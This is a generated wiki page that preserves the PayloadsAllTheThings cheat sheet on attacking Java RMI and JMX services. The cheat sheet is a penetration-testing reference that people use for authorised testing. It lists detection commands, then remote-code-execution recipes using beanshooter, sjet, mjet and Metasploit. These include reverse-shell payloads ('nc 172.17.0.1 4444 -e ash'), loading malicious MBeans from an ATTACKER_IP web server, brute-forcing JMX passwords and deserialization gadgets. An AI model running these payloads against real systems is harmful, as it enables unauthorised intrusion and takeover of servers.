---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Java RMI

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-java-rmi-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Java RMI/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Java RMI](../../topics/java-rmi/java-rmi.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-java-rmi-readme |
| name | Java RMI |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Java%20RMI/README.md |

## Preserved Source Material

````yaml
_body: "# Java RMI\n\n> Java RMI (Remote Method Invocation) is a Java API that allows an object running in one JVM (Java Virtual\
  \ Machine) to invoke methods on an object running in another JVM, even if they're on different physical machines. RMI provides\
  \ a mechanism for Java-based distributed computing.\n\n## Summary\n\n* [Tools](#tools)\n* [Detection](#detection)\n* [Methodology](#methodology)\n\
  \    * [RCE using beanshooter](#rce-using-beanshooter)\n    * [RCE using sjet/mjet](#rce-using-sjet-or-mjet)\n    * [RCE\
  \ using Metasploit](#rce-using-metasploit)\n* [References](#references)\n\n## Tools\n\n* [siberas/sjet](https://github.com/siberas/sjet)\
  \ - siberas JMX exploitation toolkit\n* [mogwailabs/mjet](https://github.com/mogwailabs/mjet) - MOGWAI LABS JMX exploitation\
  \ toolkit\n* [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) - Java RMI Vulnerability Scanner\n\
  * [qtc-de/beanshooter](https://github.com/qtc-de/beanshooter) - JMX enumeration and attacking tool.\n\n## Detection\n\n\
  * Using [nmap](https://nmap.org/):\n\n  ```powershell\n  $ nmap -sV --script \"rmi-dumpregistry or rmi-vuln-classloader\"\
  \ -p TARGET_PORT TARGET_IP -Pn -v\n  1089/tcp open  java-rmi Java RMI\n  | rmi-vuln-classloader:\n  |   VULNERABLE:\n  |\
  \   RMI registry default configuration remote code execution vulnerability\n  |     State: VULNERABLE\n  |       Default\
  \ configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.\n  | rmi-dumpregistry:\n\
  \  |   jmxrmi\n  |     javax.management.remote.rmi.RMIServerImpl_Stub\n  ```\n\n* Using [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser):\n\
  \n  ```bash\n  $ rmg scan 172.17.0.2 --ports 0-65535\n  [+] Scanning 6225 Ports on 172.17.0.2 for RMI services.\n  [+] \
  \ [HIT] Found RMI service(s) on 172.17.0.2:40393 (DGC)\n  [+]  [HIT] Found RMI service(s) on 172.17.0.2:1090  (Registry,\
  \ DGC)\n  [+]  [HIT] Found RMI service(s) on 172.17.0.2:9010  (Registry, Activator, DGC)\n  [+]  [6234 / 6234] [#############################]\
  \ 100%\n  [+] Portscan finished.\n\n  $ rmg enum 172.17.0.2 9010\n  [+] RMI registry bound names:\n  [+]\n  [+]  - plain-server2\n\
  \  [+]   --> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)\n  [+]       Endpoint: iinsecure.dev:39153 ObjID:\
  \ [-af587e6:17d6f7bb318:-7ff7, 9040809218460289711]\n  [+]  - legacy-service\n  [+]   --> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub\
  \ (unknown class)\n  [+]       Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ffc, 4854919471498518309]\n\
  \  [+]  - plain-server\n  [+]   --> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)\n  [+]       Endpoint: iinsecure.dev:39153\
  \ ObjID: [-af587e6:17d6f7bb318:-7ff8, 6721714394791464813]\n  [...]\n  ```\n\n* Using [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)\n\
  \n  ```bash\n  use auxiliary/scanner/misc/java_rmi_server\n  set RHOSTS <IPs>\n  set RPORT <PORT>\n  run\n  ```\n\n## Methodology\n\
  \nIf a Java Remote Method Invocation (RMI) service is poorly configured, it becomes vulnerable to various Remote Code Execution\
  \ (RCE) methods. One method involves hosting an MLet file and directing the JMX service to load MBeans from a distant server,\
  \ achievable using tools like mjet or sjet. The remote-method-guesser tool is newer and combines RMI service enumeration\
  \ with an overview of recognized attack strategies.\n\n### RCE using beanshooter\n\n* List available attributes: `beanshooter\
  \ info 172.17.0.2 9010`\n* Display value of an attribute: `beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose`\n\
  * Set the value of an attribute: `beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose true --type boolean`\n\
  * Bruteforce a password protected JMX service: `beanshooter brute 172.17.0.2 1090`\n* List registered MBeans: `beanshooter\
  \ list 172.17.0.2 9010`\n* Deploy an MBean: `beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example\
  \ --jar-file exampleBean.jar --stager-url http://172.17.0.1:8000`\n* Enumerate JMX endpoint: `beanshooter enum 172.17.0.2\
  \ 1090`\n* Invoke method on a JMX endpoint: `beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand\
  \ --signature 'vmVersion()'`\n* Invoke arbitrary public and static Java methods:\n\n    ```ps1\n    beanshooter model 172.17.0.2\
  \ 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File(\"/\")'\n    beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1\
  \ --signature 'list()'\n    ```\n\n* Standard MBean execution: `beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1\
  \ 4444 -e ash'`\n* Deserialization attacks on a JMX endpoint: `beanshooter serial 172.17.0.2 1090 CommonsCollections6 \"\
  nc 172.17.0.1 4444 -e ash\" --username admin --password admin`\n\n### RCE using sjet or mjet\n\n#### Requirements\n\n* Jython\n\
  * The JMX server can connect to a http service that is controlled by the attacker\n* JMX authentication is not enabled\n\
  \n#### Remote Command Execution\n\nThe attack involves the following steps:\n\n* Starting a web server that hosts the MLet\
  \ and a JAR file with the malicious MBeans\n* Creating a instance of the MBean `javax.management.loading.MLet` on the target\
  \ server, using JMX\n* Invoking the `getMBeansFromURL` method of the MBean instance, passing the webserver URL as parameter.\
  \ The JMX service will connect to the http server and parse the MLet file.\n* The JMX service downloads and loades the JAR\
  \ files that were referenced in the MLet file, making the malicious MBean available over JMX.\n* The attacker finally invokes\
  \ methods from the malicious MBean.\n\nExploit the JMX using [siberas/sjet](https://github.com/siberas/sjet) or [mogwailabs/mjet](https://github.com/mogwailabs/mjet)\n\
  \n```powershell\njython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000\njython sjet.py\
  \ TARGET_IP TARGET_PORT super_secret command \"ls -la\"\njython sjet.py TARGET_IP TARGET_PORT super_secret shell\njython\
  \ sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password\njython sjet.py TARGET_IP TARGET_PORT super_secret\
  \ uninstall\njython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6\
  \ \"touch /tmp/xxx\"\n\njython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000\njython mjet.py\
  \ TARGET_IP TARGET_PORT command super_secret \"whoami\"\njython mjet.py TARGET_IP TARGET_PORT command super_secret shell\n\
  ```\n\n### RCE using Metasploit\n\n```bash\nuse exploit/multi/misc/java_rmi_server\nset RHOSTS <IPs>\nset RPORT <PORT>\n\
  # configure also the payload if needed\nrun\n```\n\n## References\n\n* [Attacking RMI based JMX services - Hans-Martin Münch\
  \ - April 28, 2019](https://web.archive.org/web/20201024121233/https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/)\n\
  * [JMX RMI - MULTIPLE APPLICATIONS RCE - Red Timmy Security - March 26, 2019](https://web.archive.org/web/20250523025328/https://www.exploit-db.com/docs/english/46607-jmx-rmi-%E2%80%93-multiple-applications-remote-code-execution.pdf)\n\
  * [remote-method-guesser - BHUSA 2021 Arsenal - Tobias Neitzel - August 15, 2021](https://web.archive.org/web/20210817144943/https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal)"
_relative_path: Java RMI/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Java RMI/README.md
````
